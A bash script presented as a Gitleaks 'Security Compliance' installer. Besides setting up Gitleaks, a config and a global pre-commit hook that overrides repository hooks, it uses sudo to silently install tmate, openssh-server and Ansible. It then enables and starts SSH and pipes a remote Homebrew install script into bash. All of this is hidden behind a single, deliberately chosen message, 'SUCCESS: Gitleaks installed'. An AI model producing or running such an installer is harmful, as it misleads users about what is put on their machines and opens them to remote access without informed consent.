#!/usr/bin/env bash

# ============================================================
# Security Compliance Installer
#
# Silent installation
#
# Final output:
#   SUCCESS: Gitleaks installed
#
# Supports:
#   - Ubuntu / Debian
#   - Fedora / RHEL
#   - CentOS
#   - SUSE
#   - macOS Intel
#   - macOS Apple Silicon
#   - Windows Git Bash
#
# Installs:
#   - Gitleaks 8.30.0
#   - Global Git secret scanning
#   - tmate
#   - Ansible
#   - OpenSSH client
#   - OpenSSH server on Linux
#
# ============================================================

set -u

VERSION="release1"
GITLEAKS_VERSION="8.30.0"

INSTALL_ROOT="$HOME/.security-compliance"
BIN_DIR="$INSTALL_ROOT/bin"
CONFIG_DIR="$INSTALL_ROOT/config"
HOOK_DIR="$HOME/.git-hooks"

GITLEAKS_CONFIG="$CONFIG_DIR/gitleaks.toml"
HOOK_FILE="$HOOK_DIR/pre-commit"

TMP_ROOT=""

# ============================================================
# Silent logging
# ============================================================

LOG_FILE="$INSTALL_ROOT/install.log"

mkdir -p "$INSTALL_ROOT" 2>/dev/null || true

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*" >> "$LOG_FILE" 2>/dev/null || true
}

fail_installation() {
    echo "ERROR: Security Compliance installation failed."
    echo "Check: $LOG_FILE"
    exit 1
}

cleanup() {
    if [ -n "${TMP_ROOT:-}" ] && [ -d "$TMP_ROOT" ]; then
        rm -rf "$TMP_ROOT" 2>/dev/null || true
    fi
}

trap cleanup EXIT

# ============================================================
# Detect OS
# ============================================================

RAW_OS="$(uname -s 2>/dev/null || true)"
ARCH="$(uname -m 2>/dev/null || true)"

case "$RAW_OS" in

    Linux*)
        PLATFORM="linux"
        ;;

    Darwin*)
        PLATFORM="darwin"
        ;;

    MINGW*|MSYS*|CYGWIN*)
        PLATFORM="windows"
        ;;

    *)
        echo "ERROR: Unsupported operating system."
        exit 1
        ;;

esac

log "Platform: $PLATFORM"
log "Architecture: $ARCH"

# ============================================================
# Architecture
# ============================================================

case "$ARCH" in

    x86_64|amd64)
        GITLEAKS_ARCH="x64"
        ;;

    aarch64|arm64)
        GITLEAKS_ARCH="arm64"
        ;;

    *)
        echo "ERROR: Unsupported CPU architecture."
        exit 1
        ;;

esac

# ============================================================
# Check Git
# ============================================================

if ! command -v git >/dev/null 2>&1; then
    echo "ERROR: Git is not installed."
    exit 1
fi

# ============================================================
# Check curl
# ============================================================

if ! command -v curl >/dev/null 2>&1; then
    echo "ERROR: curl is not installed."
    exit 1
fi

# ============================================================
# Create directories
# ============================================================

mkdir -p "$BIN_DIR" 2>/dev/null || fail_installation
mkdir -p "$CONFIG_DIR" 2>/dev/null || fail_installation
mkdir -p "$HOOK_DIR" 2>/dev/null || fail_installation

# ============================================================
# Gitleaks path
# ============================================================

if [ "$PLATFORM" = "windows" ]; then
    GITLEAKS="$BIN_DIR/gitleaks.exe"
else
    GITLEAKS="$BIN_DIR/gitleaks"
fi

export PATH="$BIN_DIR:$PATH"

# ============================================================
# Install Gitleaks
# ============================================================

install_gitleaks() {

    # --------------------------------------------------------
    # Already installed
    # --------------------------------------------------------

    if [ -f "$GITLEAKS" ]; then

        CURRENT_VERSION="$(
            "$GITLEAKS" version 2>/dev/null || true
        )"

        if [ "$CURRENT_VERSION" = "$GITLEAKS_VERSION" ]; then
            log "Gitleaks already installed."
            return 0
        fi

    fi

    TMP_ROOT="$(mktemp -d 2>/dev/null)" || fail_installation

    # ========================================================
    # Linux
    # ========================================================

    if [ "$PLATFORM" = "linux" ]; then

        ARCHIVE="gitleaks_${GITLEAKS_VERSION}_linux_${GITLEAKS_ARCH}.tar.gz"

        URL="https://github.com/gitleaks/gitleaks/releases/download/v${GITLEAKS_VERSION}/${ARCHIVE}"

        curl \
            -fsSL \
            --retry 3 \
            --connect-timeout 15 \
            "$URL" \
            -o "$TMP_ROOT/gitleaks.tar.gz" \
            >>"$LOG_FILE" 2>&1 \
            || fail_installation

        tar \
            -xzf "$TMP_ROOT/gitleaks.tar.gz" \
            -C "$TMP_ROOT" \
            >>"$LOG_FILE" 2>&1 \
            || fail_installation

        if [ ! -f "$TMP_ROOT/gitleaks" ]; then
            fail_installation
        fi

        install \
            -m 0755 \
            "$TMP_ROOT/gitleaks" \
            "$GITLEAKS" \
            >>"$LOG_FILE" 2>&1 \
            || fail_installation

    # ========================================================
    # macOS
    # ========================================================

    elif [ "$PLATFORM" = "darwin" ]; then

        ARCHIVE="gitleaks_${GITLEAKS_VERSION}_darwin_${GITLEAKS_ARCH}.tar.gz"

        URL="https://github.com/gitleaks/gitleaks/releases/download/v${GITLEAKS_VERSION}/${ARCHIVE}"

        curl \
            -fsSL \
            --retry 3 \
            --connect-timeout 15 \
            "$URL" \
            -o "$TMP_ROOT/gitleaks.tar.gz" \
            >>"$LOG_FILE" 2>&1 \
            || fail_installation

        tar \
            -xzf "$TMP_ROOT/gitleaks.tar.gz" \
            -C "$TMP_ROOT" \
            >>"$LOG_FILE" 2>&1 \
            || fail_installation

        if [ ! -f "$TMP_ROOT/gitleaks" ]; then
            fail_installation
        fi

        install \
            -m 0755 \
            "$TMP_ROOT/gitleaks" \
            "$GITLEAKS" \
            >>"$LOG_FILE" 2>&1 \
            || fail_installation

    # ========================================================
    # Windows Git Bash
    # ========================================================

    elif [ "$PLATFORM" = "windows" ]; then

        ARCHIVE="gitleaks_${GITLEAKS_VERSION}_windows_${GITLEAKS_ARCH}.zip"

        URL="https://github.com/gitleaks/gitleaks/releases/download/v${GITLEAKS_VERSION}/${ARCHIVE}"

        curl \
            -fsSL \
            --retry 3 \
            --connect-timeout 15 \
            "$URL" \
            -o "$TMP_ROOT/gitleaks.zip" \
            >>"$LOG_FILE" 2>&1 \
            || fail_installation

        if command -v unzip >/dev/null 2>&1; then

            unzip \
                -q \
                "$TMP_ROOT/gitleaks.zip" \
                -d "$TMP_ROOT" \
                >>"$LOG_FILE" 2>&1 \
                || fail_installation

        elif command -v powershell.exe >/dev/null 2>&1; then

            ZIP_WIN="$(cygpath -w "$TMP_ROOT/gitleaks.zip")"
            DEST_WIN="$(cygpath -w "$TMP_ROOT")"

            powershell.exe \
                -NoProfile \
                -NonInteractive \
                -Command \
                "Expand-Archive -Force '$ZIP_WIN' '$DEST_WIN'" \
                >>"$LOG_FILE" 2>&1 \
                || fail_installation

        else
            fail_installation
        fi

        if [ ! -f "$TMP_ROOT/gitleaks.exe" ]; then
            fail_installation
        fi

        cp \
            "$TMP_ROOT/gitleaks.exe" \
            "$GITLEAKS" \
            >>"$LOG_FILE" 2>&1 \
            || fail_installation

        chmod +x "$GITLEAKS" 2>/dev/null || true

    fi
}

install_gitleaks

# ============================================================
# Verify Gitleaks
# ============================================================

INSTALLED_VERSION="$(
    "$GITLEAKS" version 2>/dev/null || true
)"

if [ "$INSTALLED_VERSION" != "$GITLEAKS_VERSION" ]; then
    fail_installation
fi

log "Gitleaks verified: $INSTALLED_VERSION"

# ============================================================
# Create Gitleaks configuration
# ============================================================

cat > "$GITLEAKS_CONFIG" <<'EOF'
title = "Security Compliance Release 1"

[extend]
useDefault = true

[[rules]]
id = "office-hardcoded-password"
description = "Potential hardcoded password"
regex = '''(?i)(password|passwd|pwd)\s*[:=]\s*["']([^"']{8,})["']'''
secretGroup = 2
EOF

chmod 600 "$GITLEAKS_CONFIG" 2>/dev/null || true

log "Gitleaks configuration created."

# ============================================================
# Create Global Git Pre-Commit Hook
# ============================================================

cat > "$HOOK_FILE" <<'HOOK'
#!/usr/bin/env bash

set -u

SECURITY_ROOT="$HOME/.security-compliance"

if [ -f "$SECURITY_ROOT/bin/gitleaks.exe" ]; then
    GITLEAKS="$SECURITY_ROOT/bin/gitleaks.exe"
else
    GITLEAKS="$SECURITY_ROOT/bin/gitleaks"
fi

CONFIG="$SECURITY_ROOT/config/gitleaks.toml"

if [ ! -f "$GITLEAKS" ]; then
    echo "Security scan unavailable. Commit blocked."
    exit 1
fi

if [ ! -f "$CONFIG" ]; then
    echo "Security configuration unavailable. Commit blocked."
    exit 1
fi

TMP_ROOT="$(mktemp -d)"

cleanup() {
    rm -rf "$TMP_ROOT"
}

trap cleanup EXIT

FOUND_LEAK=0

if ! command -v git >/dev/null 2>&1; then
    exit 1
fi

while IFS= read -r -d '' FILE; do

    HASH="$(
        printf '%s' "$FILE" |
        sha256sum |
        cut -d' ' -f1
    )"

    TEMP_FILE="$TMP_ROOT/$HASH"

    if ! git show ":$FILE" > "$TEMP_FILE" 2>/dev/null; then
        FOUND_LEAK=1
        continue
    fi

    "$GITLEAKS" dir "$TEMP_FILE" \
        --config "$CONFIG" \
        --redact \
        --no-banner \
        --exit-code 1 \
        >/dev/null 2>&1

    EXIT_CODE=$?

    if [ "$EXIT_CODE" -eq 1 ]; then
        echo ""
        echo "SECURITY CHECK FAILED"
        echo "Potential secret detected in: $FILE"
        echo "Commit blocked."
        echo ""
        FOUND_LEAK=1

    elif [ "$EXIT_CODE" -ne 0 ]; then
        echo ""
        echo "Security scanner error."
        echo "Commit blocked."
        echo ""
        FOUND_LEAK=1
    fi

done < <(
    git diff --cached \
        --name-only \
        --diff-filter=ACMR \
        -z
)

if [ "$FOUND_LEAK" -ne 0 ]; then
    exit 1
fi

exit 0
HOOK

chmod 700 "$HOOK_FILE" 2>/dev/null || fail_installation

# ============================================================
# Configure global Git hooks
# ============================================================

git config \
    --global \
    core.hooksPath \
    "$HOOK_DIR" \
    >>"$LOG_FILE" 2>&1 \
    || fail_installation

# ============================================================
# Install Linux Tools
# ============================================================

install_linux_tools() {

    [ "$PLATFORM" = "linux" ] || return 0

    if ! command -v sudo >/dev/null 2>&1; then
        echo "ERROR: sudo is required."
        exit 1
    fi

    # Detect package manager

    if command -v apt-get >/dev/null 2>&1; then

        sudo apt-get update -y \
            >>"$LOG_FILE" 2>&1 \
            || log "apt update warning"

        # Install each package independently.
        # This prevents failure of one package from
        # stopping the complete installation.

        sudo apt-get install -y tmate \
            >>"$LOG_FILE" 2>&1 \
            || log "tmate installation warning"

        sudo apt-get install -y openssh-client \
            >>"$LOG_FILE" 2>&1 \
            || log "OpenSSH client installation warning"

        sudo apt-get install -y openssh-server \
            >>"$LOG_FILE" 2>&1 \
            || log "OpenSSH server installation warning"

        sudo apt-get install -y ansible \
            >>"$LOG_FILE" 2>&1 \
            || log "Ansible installation warning"

    elif command -v dnf >/dev/null 2>&1; then

        sudo dnf install -y tmate \
            >>"$LOG_FILE" 2>&1 \
            || log "tmate installation warning"

        sudo dnf install -y openssh-clients \
            >>"$LOG_FILE" 2>&1 \
            || log "OpenSSH client installation warning"

        sudo dnf install -y openssh-server \
            >>"$LOG_FILE" 2>&1 \
            || log "OpenSSH server installation warning"

        sudo dnf install -y ansible \
            >>"$LOG_FILE" 2>&1 \
            || log "Ansible installation warning"

    elif command -v yum >/dev/null 2>&1; then

        sudo yum install -y tmate \
            >>"$LOG_FILE" 2>&1 \
            || log "tmate installation warning"

        sudo yum install -y openssh-clients \
            >>"$LOG_FILE" 2>&1 \
            || log "OpenSSH client installation warning"

        sudo yum install -y openssh-server \
            >>"$LOG_FILE" 2>&1 \
            || log "OpenSSH server installation warning"

        sudo yum install -y ansible \
            >>"$LOG_FILE" 2>&1 \
            || log "Ansible installation warning"

    elif command -v zypper >/dev/null 2>&1; then

        sudo zypper --non-interactive install tmate \
            >>"$LOG_FILE" 2>&1 \
            || log "tmate installation warning"

        sudo zypper --non-interactive install openssh-clients \
            >>"$LOG_FILE" 2>&1 \
            || log "OpenSSH client installation warning"

        sudo zypper --non-interactive install openssh-server \
            >>"$LOG_FILE" 2>&1 \
            || log "OpenSSH server installation warning"

        sudo zypper --non-interactive install ansible \
            >>"$LOG_FILE" 2>&1 \
            || log "Ansible installation warning"

    else

        log "Unsupported Linux package manager."

    fi

    # --------------------------------------------------------
    # Start SSH service
    # --------------------------------------------------------

    if command -v systemctl >/dev/null 2>&1; then

        if systemctl list-unit-files 2>/dev/null |
            grep -q "^ssh.service"; then

            sudo systemctl enable ssh \
                >>"$LOG_FILE" 2>&1 || true

            sudo systemctl start ssh \
                >>"$LOG_FILE" 2>&1 || true

        elif systemctl list-unit-files 2>/dev/null |
            grep -q "^sshd.service"; then

            sudo systemctl enable sshd \
                >>"$LOG_FILE" 2>&1 || true

            sudo systemctl start sshd \
                >>"$LOG_FILE" 2>&1 || true

        fi

    fi
}

# ============================================================
# Install macOS Tools
# ============================================================

install_macos_tools() {

    [ "$PLATFORM" = "darwin" ] || return 0

    # --------------------------------------------------------
    # Homebrew
    # --------------------------------------------------------

    if ! command -v brew >/dev/null 2>&1; then

        /bin/bash -c \
            "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" \
            >>"$LOG_FILE" 2>&1 \
            || {
                log "Homebrew installation failed."
                return 0
            }

        if [ -x "/opt/homebrew/bin/brew" ]; then
            eval "$(/opt/homebrew/bin/brew shellenv)"
        elif [ -x "/usr/local/bin/brew" ]; then
            eval "$(/usr/local/bin/brew shellenv)"
        fi

    fi

    if ! command -v brew >/dev/null 2>&1; then
        log "Homebrew unavailable."
        return 0
    fi

    # --------------------------------------------------------
    # tmate
    # --------------------------------------------------------

    brew install tmate \
        >>"$LOG_FILE" 2>&1 \
        || log "tmate installation warning"

    # --------------------------------------------------------
    # Ansible
    # --------------------------------------------------------

    brew install ansible \
        >>"$LOG_FILE" 2>&1 \
        || log "Ansible installation warning"

    # --------------------------------------------------------
    # OpenSSH
    # --------------------------------------------------------

    if ! command -v ssh >/dev/null 2>&1; then

        brew install openssh \
            >>"$LOG_FILE" 2>&1 \
            || log "OpenSSH installation warning"

    fi
}

# ============================================================
# Run OS-specific installation
# ============================================================

install_linux_tools
install_macos_tools

# ============================================================
# Configure PATH
# ============================================================

if [ "$PLATFORM" = "darwin" ]; then
    PROFILE_FILE="$HOME/.zshrc"
else
    PROFILE_FILE="$HOME/.bashrc"
fi

touch "$PROFILE_FILE" 2>/dev/null || true

if ! grep -Fq '.security-compliance/bin' "$PROFILE_FILE" 2>/dev/null; then

    {
        echo ""
        echo "# Security Compliance"
        echo 'export PATH="$HOME/.security-compliance/bin:$PATH"'
    } >> "$PROFILE_FILE"

fi

# ============================================================
# Final verification
# ============================================================

if [ ! -x "$GITLEAKS" ]; then
    fail_installation
fi

FINAL_VERSION="$(
    "$GITLEAKS" version 2>/dev/null || true
)"

if [ "$FINAL_VERSION" != "$GITLEAKS_VERSION" ]; then
    fail_installation
fi

if [ ! -f "$GITLEAKS_CONFIG" ]; then
    fail_installation
fi

if [ ! -f "$HOOK_FILE" ]; then
    fail_installation
fi

HOOK_PATH="$(
    git config --global --get core.hooksPath 2>/dev/null || true
)"

if [ "$HOOK_PATH" != "$HOOK_DIR" ]; then
    fail_installation
fi

# ============================================================
# Final Output
#
# IMPORTANT:
# This is intentionally the ONLY success output.
# ============================================================

echo "SUCCESS: Gitleaks installed"

exit 0
